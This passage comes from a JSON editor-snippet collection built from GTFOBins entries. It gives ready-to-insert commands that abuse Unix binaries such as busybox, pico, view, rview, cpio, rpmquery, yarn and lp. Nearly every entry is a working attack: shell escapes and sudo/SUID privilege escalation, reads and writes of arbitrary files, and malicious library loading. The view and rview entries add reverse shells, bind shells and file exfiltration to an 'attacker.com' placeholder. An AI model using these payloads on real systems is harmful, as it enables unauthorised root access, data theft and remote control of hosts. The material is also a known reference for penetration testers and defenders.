            "abuse split with shell, The shell prompt is not printed.",
            "",
            "```sh",
            "split --filter=/bin/sh /dev/stdin${0}",
            "```"
        ],
        "description": "abuse split with shell - The shell prompt is not printed."
    },
    "split sudo (gtfobins)": {
        "prefix": "split sudo",
        "body": [
            "abuse split with sudo, The shell prompt is not printed.",
            "",
            "```sh",
            "sudo split --filter=/bin/sh /dev/stdin${0}",
            "```"
        ],
        "description": "abuse split with sudo - The shell prompt is not printed."
    },
    "busybox shell (gtfobins)": {
        "prefix": "busybox shell",
        "body": [
            "abuse busybox with shell",
            "",
            "```sh",
            "busybox sh${0}",
            "```"
        ],
        "description": "abuse busybox with shell"
    },
    "busybox file-upload (gtfobins)": {
        "prefix": "busybox file-upload",
        "body": [
            "abuse busybox with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "busybox httpd -f -p \\$LPORT -h .${0}",
            "```"
        ],
        "description": "abuse busybox with file-upload - Serve files in the local folder running an HTTP server."
    },
    "busybox file-write (gtfobins)": {
        "prefix": "busybox file-write",
        "body": [
            "abuse busybox with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "busybox sh -c 'echo \"DATA\" > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse busybox with file-write"
    },
    "busybox file-read (gtfobins)": {
        "prefix": "busybox file-read",
        "body": [
            "abuse busybox with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./busybox cat \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse busybox with file-read"
    },
    "busybox suid (gtfobins)": {
        "prefix": "busybox suid",
        "body": [
            "abuse busybox with suid, It may drop the SUID privileges depending on the compilation flags and the runtime configuration.",
            "",
            "```sh",
            "./busybox sh${0}",
            "```"
        ],
        "description": "abuse busybox with suid - It may drop the SUID privileges depending on the compilation flags and the runtime configuration."
    },
    "busybox sudo (gtfobins)": {
        "prefix": "busybox sudo",
        "body": [
            "abuse busybox with sudo",
            "",
            "```sh",
            "sudo busybox sh${0}",
            "```"
        ],
        "description": "abuse busybox with sudo"
    },
    "busybox reverse-shell (gtfobins)": {
        "prefix": "busybox reverse-shell",
        "body": [
            "abuse busybox with reverse-shell, Run `nc -lvp 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "busybox nc -e /bin/sh \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse busybox with reverse-shell - Run `nc -lvp 12345` on the attacker box to receive the shell."
    },
    "unsquashfs sudo (gtfobins)": {
        "prefix": "unsquashfs sudo",
        "body": [
            "abuse unsquashfs with sudo",
            "",
            "```sh",
            "sudo unsquashfs shell",
            "./squashfs-root/sh -p${0}",
            "```"
        ],
        "description": "abuse unsquashfs with sudo"
    },
    "unsquashfs suid (gtfobins)": {
        "prefix": "unsquashfs suid",
        "body": [
            "abuse unsquashfs with suid",
            "",
            "```sh",
            "./unsquashfs shell",
            "./squashfs-root/sh -p${0}",
            "```"
        ],
        "description": "abuse unsquashfs with suid"
    },
    "pico shell (gtfobins)": {
        "prefix": "pico shell",
        "body": [
            "abuse pico with shell, The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
            "",
            "```sh",
            "pico -s /bin/sh",
            "/bin/sh",
            "^T${0}",
            "```"
        ],
        "description": "abuse pico with shell - The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed."
    },
    "pico file-write (gtfobins)": {
        "prefix": "pico file-write",
        "body": [
            "abuse pico with file-write",
            "",
            "```sh",
            "pico ${1:file_to_write}",
            "DATA",
            "^O${0}",
            "```"
        ],
        "description": "abuse pico with file-write"
    },
    "pico file-read (gtfobins)": {
        "prefix": "pico file-read",
        "body": [
            "abuse pico with file-read",
            "",
            "```sh",
            "pico ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse pico with file-read"
    },
    "pico limited-suid (gtfobins)": {
        "prefix": "pico limited-suid",
        "body": [
            "abuse pico with limited-suid, The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
            "",
            "```sh",
            "./pico -s /bin/sh",
            "/bin/sh",
            "^T${0}",
            "```"
        ],
        "description": "abuse pico with limited-suid - The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed."
    },
    "pico sudo (gtfobins)": {
        "prefix": "pico sudo",
        "body": [
            "abuse pico with sudo",
            "",
            "```sh",
            "sudo pico",
            "^R^X",
            "reset; sh 1>&0 2>&0${0}",
            "```"
        ],
        "description": "abuse pico with sudo"
    },
    "pry shell (gtfobins)": {
        "prefix": "pry shell",
        "body": [
            "abuse pry with shell",
            "",
            "```sh",
            "pry",
            "system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse pry with shell"
    },
    "pry sudo (gtfobins)": {
        "prefix": "pry sudo",
        "body": [
            "abuse pry with sudo",
            "",
            "```sh",
            "sudo pry",
            "system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse pry with sudo"
    },
    "pry limited-suid (gtfobins)": {
        "prefix": "pry limited-suid",
        "body": [
            "abuse pry with limited-suid",
            "",
            "```sh",
            "./pry",
            "system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse pry with limited-suid"
    },
    "lwp-request file-read (gtfobins)": {
        "prefix": "lwp-request file-read",
        "body": [
            "abuse lwp-request with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "lwp-request \"file://\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse lwp-request with file-read"
    },
    "lwp-request sudo (gtfobins)": {
        "prefix": "lwp-request sudo",
        "body": [
            "abuse lwp-request with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo lwp-request \"file://\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse lwp-request with sudo"
    },
    "redis file-write (gtfobins)": {
        "prefix": "redis file-write",
        "body": [
            "abuse redis with file-write, Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes.",
            "",
            "```sh",
            "IP=127.0.0.1",
            "redis-cli -h \\$IP",
            "config set dir dir_to_write_to",
            "config set dbfilename ${1:file_to_write}",
            "set x \"DATA\"",
            "save${0}",
            "```"
        ],
        "description": "abuse redis with file-write - Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes."
    },
    "ldconfig sudo (gtfobins)": {
        "prefix": "ldconfig sudo",
        "body": [
            "abuse ldconfig with sudo, This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"\\$TF\" > \"\\$TF/conf\"",
            "# move malicious libraries in \\$TF",
            "sudo ldconfig -f \"\\$TF/conf\"${0}",
            "```"
        ],
        "description": "abuse ldconfig with sudo - This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries."
    },
    "ldconfig limited-suid (gtfobins)": {
        "prefix": "ldconfig limited-suid",
        "body": [
            "abuse ldconfig with limited-suid, This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"\\$TF\" > \"\\$TF/conf\"",
            "# move malicious libraries in \\$TF",
            "./ldconfig -f \"\\$TF/conf\"${0}",
            "```"
        ],
        "description": "abuse ldconfig with limited-suid - This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries."
    },
    "pr file-read (gtfobins)": {
        "prefix": "pr file-read",
        "body": [
            "abuse pr with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pr -T \\$LFILE${0}",
            "```"
        ],
        "description": "abuse pr with file-read"
    },
    "pr suid (gtfobins)": {
        "prefix": "pr suid",
        "body": [
            "abuse pr with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pr -T \\$LFILE${0}",
            "```"
        ],
        "description": "abuse pr with suid"
    },
    "pr sudo (gtfobins)": {
        "prefix": "pr sudo",
        "body": [
            "abuse pr with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pr -T \\$LFILE${0}",
            "```"
        ],
        "description": "abuse pr with sudo"
    },
    "rpmquery shell (gtfobins)": {
        "prefix": "rpmquery shell",
        "body": [
            "abuse rpmquery with shell",
            "",
            "```sh",
            "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse rpmquery with shell"
    },
    "rpmquery limited-suid (gtfobins)": {
        "prefix": "rpmquery limited-suid",
        "body": [
            "abuse rpmquery with limited-suid",
            "",
            "```sh",
            "./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse rpmquery with limited-suid"
    },
    "rpmquery sudo (gtfobins)": {
        "prefix": "rpmquery sudo",
        "body": [
            "abuse rpmquery with sudo",
            "",
            "```sh",
            "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse rpmquery with sudo"
    },
    "msguniq file-read (gtfobins)": {
        "prefix": "msguniq file-read",
        "body": [
            "abuse msguniq with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msguniq -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msguniq with file-read"
    },
    "msguniq sudo (gtfobins)": {
        "prefix": "msguniq sudo",
        "body": [
            "abuse msguniq with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msguniq -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msguniq with sudo"
    },
    "msguniq suid (gtfobins)": {
        "prefix": "msguniq suid",
        "body": [
            "abuse msguniq with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msguniq -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msguniq with suid"
    },
    "view shell (gtfobins)": {
        "prefix": "view shell",
        "body": [
            "abuse view with shell, This requires that `view` is compiled with Lua support.",
            "",
            "```sh",
            "view -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse view with shell - This requires that `view` is compiled with Lua support."
    },
    "view reverse-shell (gtfobins)": {
        "prefix": "view reverse-shell",
        "body": [
            "abuse view with reverse-shell, This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "view -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse view with reverse-shell - This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "view non-interactive-reverse-shell (gtfobins)": {
        "prefix": "view non-interactive-reverse-shell",
        "body": [
            "abuse view with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "view -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse view with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
    },
    "view non-interactive-bind-shell (gtfobins)": {
        "prefix": "view non-interactive-bind-shell",
        "body": [
            "abuse view with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "view -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse view with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
    },
    "view file-upload (gtfobins)": {
        "prefix": "view file-upload",
        "body": [
            "abuse view with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "view -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse view with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
    },
    "view file-download (gtfobins)": {
        "prefix": "view file-download",
        "body": [
            "abuse view with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "view -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse view with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
    },
    "view file-write (gtfobins)": {
        "prefix": "view file-write",
        "body": [
            "abuse view with file-write",
            "",
            "```sh",
            "view ${1:file_to_write}",
            "iDATA",
            "^[",
            "w!${0}",
            "```"
        ],
        "description": "abuse view with file-write"
    },
    "view file-read (gtfobins)": {
        "prefix": "view file-read",
        "body": [
            "abuse view with file-read",
            "",
            "```sh",
            "view ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse view with file-read"
    },
    "view library-load (gtfobins)": {
        "prefix": "view library-load",
        "body": [
            "abuse view with library-load, This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse view with library-load - This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "view suid (gtfobins)": {
        "prefix": "view suid",
        "body": [
            "abuse view with suid, This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse view with suid - This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "view sudo (gtfobins)": {
        "prefix": "view sudo",
        "body": [
            "abuse view with sudo, This requires that `view` is compiled with Lua support.",
            "",
            "```sh",
            "sudo view -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse view with sudo - This requires that `view` is compiled with Lua support."
    },
    "view capabilities (gtfobins)": {
        "prefix": "view capabilities",
        "body": [
            "abuse view with capabilities, This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse view with capabilities - This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "view limited-suid (gtfobins)": {
        "prefix": "view limited-suid",
        "body": [
            "abuse view with limited-suid, This requires that `view` is compiled with Lua support.",
            "",
            "```sh",
            "./view -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse view with limited-suid - This requires that `view` is compiled with Lua support."
    },
    "tbl file-read (gtfobins)": {
        "prefix": "tbl file-read",
        "body": [
            "abuse tbl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tbl \\$LFILE${0}",
            "```"
        ],
        "description": "abuse tbl with file-read"
    },
    "tbl suid (gtfobins)": {
        "prefix": "tbl suid",
        "body": [
            "abuse tbl with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./tbl \\$LFILE${0}",
            "```"
        ],
        "description": "abuse tbl with suid"
    },
    "tbl sudo (gtfobins)": {
        "prefix": "tbl sudo",
        "body": [
            "abuse tbl with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo tbl \\$LFILE${0}",
            "```"
        ],
        "description": "abuse tbl with sudo"
    },
    "cpio shell (gtfobins)": {
        "prefix": "cpio shell",
        "body": [
            "abuse cpio with shell",
            "",
            "```sh",
            "echo '/bin/sh </dev/tty >/dev/tty' >localhost",
            "cpio -o --rsh-command /bin/sh -F localhost:${0}",
            "```"
        ],
        "description": "abuse cpio with shell"
    },
    "cpio file-read (gtfobins)": {
        "prefix": "cpio file-read",
        "body": [
            "abuse cpio with file-read, The whole directory structure is copied to `$TF`.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp -d)",
            "echo \"\\$LFILE\" | cpio -dp \\$TF",
            "cat \"\\$TF/\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cpio with file-read - The whole directory structure is copied to `$TF`."
    },
    "cpio file-write (gtfobins)": {
        "prefix": "cpio file-write",
        "body": [
            "abuse cpio with file-write, Copies `$LFILE` to the `$LDIR` directory.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\\$LFILE",
            "echo \\$LFILE | cpio -up \\$LDIR${0}",
            "```"
        ],
        "description": "abuse cpio with file-write - Copies `$LFILE` to the `$LDIR` directory."
    },
    "cpio suid (gtfobins)": {
        "prefix": "cpio suid",
        "body": [
            "abuse cpio with suid, Copies `$LFILE` to the `$LDIR` directory.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\\$LFILE",
            "echo \\$LFILE | ./cpio -R 0:0 -p \\$LDIR${0}",
            "```"
        ],
        "description": "abuse cpio with suid - Copies `$LFILE` to the `$LDIR` directory."
    },
    "cpio sudo (gtfobins)": {
        "prefix": "cpio sudo",
        "body": [
            "abuse cpio with sudo, Copies `$LFILE` to the `$LDIR` directory.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\\$LFILE",
            "echo \\$LFILE | sudo cpio -R 0:0 -p \\$LDIR${0}",
            "```"
        ],
        "description": "abuse cpio with sudo - Copies `$LFILE` to the `$LDIR` directory."
    },
    "nl file-read (gtfobins)": {
        "prefix": "nl file-read",
        "body": [
            "abuse nl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nl -bn -w1 -s '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nl with file-read"
    },
    "nl suid (gtfobins)": {
        "prefix": "nl suid",
        "body": [
            "abuse nl with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nl -bn -w1 -s '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nl with suid"
    },
    "nl sudo (gtfobins)": {
        "prefix": "nl sudo",
        "body": [
            "abuse nl with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo nl -bn -w1 -s '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nl with sudo"
    },
    "rtorrent shell (gtfobins)": {
        "prefix": "rtorrent shell",
        "body": [
            "abuse rtorrent with shell",
            "",
            "```sh",
            "echo \"execute = /bin/sh,-c,\\\"/bin/sh <\\$(tty) >\\$(tty) 2>\\$(tty)\\\"\" >~/.rtorrent.rc",
            "rtorrent${0}",
            "```"
        ],
        "description": "abuse rtorrent with shell"
    },
    "rtorrent suid (gtfobins)": {
        "prefix": "rtorrent suid",
        "body": [
            "abuse rtorrent with suid",
            "",
            "```sh",
            "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <\\$(tty) >\\$(tty) 2>\\$(tty)\\\"\" >~/.rtorrent.rc",
            "./rtorrent${0}",
            "```"
        ],
        "description": "abuse rtorrent with suid"
    },
    "lp file-upload (gtfobins)": {
        "prefix": "lp file-upload",
        "body": [
            "abuse lp with file-upload, \nTo collect the file run the following on the attacker box (this requires `cups` to be installed):\n\n\n\n1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;\n\n2. `lpadmin -d printer` to set the new printer as default;\n\n3. `cupsctl --remote-any` to enable printing from the Internet;\n\n4. `nc -lkp 9100` to receive the file.\n\n\n\nSend a local file to a CUPS server.\n",
            "",
            "```sh",
            "LFILE=${1:file_to_send}",
            "RHOST=${2:attacker.com}",
            "lp \\$LFILE -h \\$RHOST${0}",
            "```"
        ],
        "description": "abuse lp with file-upload - \nTo collect the file run the following on the attacker box (this requires `cups` to be installed):\n\n\n\n1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;\n\n2. `lpadmin -d printer` to set the new printer as default;\n\n3. `cupsctl --remote-any` to enable printing from the Internet;\n\n4. `nc -lkp 9100` to receive the file.\n\n\n\nSend a local file to a CUPS server.\n"
    },
    "yarn shell (gtfobins)": {
        "prefix": "yarn shell",
        "body": [
            "abuse yarn with shell, Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > \\$TF/package.json",
            "yarn --cwd \\$TF install${0}",
            "```"
        ],
        "description": "abuse yarn with shell - Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`."
    },
    "yarn sudo (gtfobins)": {
        "prefix": "yarn sudo",
        "body": [
            "abuse yarn with sudo",
            "",
            "```sh",
            "sudo yarn exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse yarn with sudo"
    },
    "pax file-read (gtfobins)": {
        "prefix": "pax file-read",
        "body": [
            "abuse pax with file-read, The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pax -w \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse pax with file-read - The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files."
    },
    "rview shell (gtfobins)": {
        "prefix": "rview shell",
        "body": [
            "abuse rview with shell, This requires that `rview` is compiled with Lua support.",
            "",
            "```sh",
            "rview -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rview with shell - This requires that `rview` is compiled with Lua support."
    },
    "rview reverse-shell (gtfobins)": {
        "prefix": "rview reverse-shell",
        "body": [
            "abuse rview with reverse-shell, This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse rview with reverse-shell - This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "rview non-interactive-reverse-shell (gtfobins)": {
        "prefix": "rview non-interactive-reverse-shell",
        "body": [
            "abuse rview with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "rview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse rview with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rview non-interactive-bind-shell (gtfobins)": {
        "prefix": "rview non-interactive-bind-shell",
        "body": [
            "abuse rview with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "rview -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse rview with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rview file-upload (gtfobins)": {
        "prefix": "rview file-upload",
        "body": [
            "abuse rview with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "rview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse rview with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rview file-download (gtfobins)": {
        "prefix": "rview file-download",
        "body": [
            "abuse rview with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "rview -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse rview with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rview file-write (gtfobins)": {
        "prefix": "rview file-write",
        "body": [
            "abuse rview with file-write",
            "",
            "```sh",
            "rview ${1:file_to_write}",
            "iDATA",
            "^[",
            "w!${0}",
            "```"
        ],
        "description": "abuse rview with file-write"
    },
    "rview file-read (gtfobins)": {
        "prefix": "rview file-read",
        "body": [
            "abuse rview with file-read",
            "",
            "```sh",
            "rview ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse rview with file-read"
    },
    "rview library-load (gtfobins)": {
        "prefix": "rview library-load",
        "body": [
            "abuse rview with library-load, This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse rview with library-load - This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rview suid (gtfobins)": {
        "prefix": "rview suid",
        "body": [
            "abuse rview with suid, This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse rview with suid - This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rview sudo (gtfobins)": {
        "prefix": "rview sudo",
        "body": [
            "abuse rview with sudo, This requires that `rview` is compiled with Lua support.",
            "",
            "```sh",
            "sudo rview -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rview with sudo - This requires that `rview` is compiled with Lua support."
    },
    "rview capabilities (gtfobins)": {
        "prefix": "rview capabilities",
        "body": [
            "abuse rview with capabilities, This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
